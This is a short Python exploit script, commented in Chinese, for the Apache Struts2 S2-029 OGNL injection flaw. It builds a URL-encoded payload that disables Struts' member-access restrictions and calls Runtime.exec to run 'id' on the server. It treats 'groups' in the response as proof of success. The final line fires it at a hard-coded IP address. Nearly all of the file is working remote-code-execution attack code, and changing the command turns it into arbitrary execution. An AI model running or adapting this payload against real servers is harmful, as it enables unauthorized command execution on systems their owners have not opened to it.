import requests
# url是action或者do
class struts2_029:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_029'.format(self.url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        # message参数不是确定的。根据目标站自己选择参数
        exp = '''?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))'''
        self.url += exp
        try:
            resp = requests.get(self.url, headers=headers, timeout=10)
            #print(resp.text)
            if "groups" in resp.text:
                return "s2-029"
        except:
            #print('test --> struts2_029 Failed!')
            return None
        return None
print(struts2_029('http://45.77.123.178//default.action').attack())